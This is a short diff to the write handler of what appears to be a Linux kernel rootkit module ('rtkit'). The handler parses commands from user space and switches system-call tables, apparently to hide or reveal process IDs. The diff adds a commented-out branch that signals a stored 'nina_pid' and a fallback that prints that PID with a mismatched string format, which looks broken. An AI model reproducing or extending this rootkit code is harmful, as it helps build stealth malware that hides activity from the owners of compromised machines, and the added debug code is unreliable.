@@ -131,6 +131,11 @@ static ssize_t rtkit_write(struct file *file, const char __user *buffer,
 				new_systable();
 		} else if(!strncmp(buffer, SHOW_PID_CMD, strlen(SHOW_PID_CMD))) {
 				old_systable();
+		/*} else if(!strncmp(buffer, KILL_NINA_PID, strlen(KILL_NINA_PID))) {
+				kill(nina_pid, SIGINT);*/
+		} else {
+				/* nina_pid = buffer; */
+				printk(KERN_INFO "pid received : %s",nina_pid);
 		}
 		return count;
 }
